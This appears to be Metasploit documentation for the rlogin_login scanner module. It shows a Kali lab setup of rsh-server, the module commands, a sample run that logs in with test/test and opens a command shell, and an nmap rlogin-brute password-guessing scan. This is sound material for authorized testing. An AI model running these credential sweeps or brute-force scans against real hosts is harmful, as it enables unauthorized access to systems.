## Vulnerable Application

The R Services (rexecd, rlogind, and rshd) are a suite of unencrypted remote command/login services developed in the 1980s.
These services are all but unused in modern computing, as they have been replace by telnet and ssh.

The following was done on Kali linux:

  1. `apt-get install rsh-server` which includes: `rexecd`, `rlogind` and `rshd`.
  2. Start the service: `service openbsd-inetd start`

## Verification Steps

  1. Install and configure rexec
  2. Start msfconsole
  3. Do: `use auxiliary/scanner/rservices/rlogin_login`
  4. Do: `set rhosts`
  5. Set any other credentials that will need to be set
  6. Do: `run`

## Scenarios

  A run against the configuration from these docs

  ```
    msf > use auxiliary/scanner/rservices/rlogin_login 
    msf auxiliary(rlogin_login) > set rhosts 10.1.2.3
    rhosts => 10.1.2.3
    msf auxiliary(rlogin_login) > set password test
    password => test
    msf auxiliary(rlogin_login) > set username test
    username => test
    msf auxiliary(rlogin_login) > run
    
    [*] 10.1.2.3:513     - 10.1.2.3:513 - Starting rlogin sweep
    [*] 10.1.2.3:513     - 10.1.2.3:513 - Attempting: 'test':"test" from 'root'
    [*] 10.1.2.3:513     - 10.1.2.3:513 - Prompt: Password:
    [*] 10.1.2.3:513     - 10.1.2.3:513 - Result:     The programs included with the Kali GNU/Linux system are free software; the exact distribution terms for each program are described in the individual files in /usr/share/doc/*/copyright.  Kali GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent permitted by applicable law.
    [+] 10.1.2.3:513     - 10.1.2.3:513, rlogin 'test' successful with password "test"
    [!] 10.1.2.3:513     - *** auxiliary/scanner/rservices/rlogin_login is still calling the deprecated report_auth_info method! This needs to be updated!
    [!] 10.1.2.3:513     - *** For detailed information about LoginScanners and the Credentials objects see:
    [!] 10.1.2.3:513     -      https://github.com/rapid7/metasploit-framework/wiki/Creating-Metasploit-Framework-LoginScanners
    [!] 10.1.2.3:513     -      https://github.com/rapid7/metasploit-framework/wiki/How-to-write-a-HTTP-LoginScanner-Module
    [!] 10.1.2.3:513     - *** For examples of modules converted to just report credentials without report_auth_info, see:
    [!] 10.1.2.3:513     -      https://github.com/rapid7/metasploit-framework/pull/5376
    [!] 10.1.2.3:513     -      https://github.com/rapid7/metasploit-framework/pull/5377
    [*] Command shell session 1 opened (10.1.2.3:1023 -> 10.1.2.3:513) at 2017-05-11 20:04:24 -0400
    [*] Scanned 1 of 1 hosts (100% complete)
    [*] Auxiliary module execution completed
  ```

## Confirming using NMAP

Utilizing [rlogin-brute](https://nmap.org/nsedoc/scripts/rlogin-brute.html)

  ```
    nmap -p 513 --script rlogin-brute 10.1.2.3
    
    Starting Nmap 7.40 ( https://nmap.org ) at 2017-05-11 20:07 EDT
    Nmap scan report for test (10.1.2.3)
    Host is up (0.000039s latency).
    PORT    STATE SERVICE
    513/tcp open  login
    | rlogin-brute: 
    |   Accounts: No valid accounts found
    |_  Statistics: Performed 6662201 guesses in 609 seconds, average tps: 10491.0
    
    Nmap done: 1 IP address (1 host up) scanned in 608.75 seconds
  ```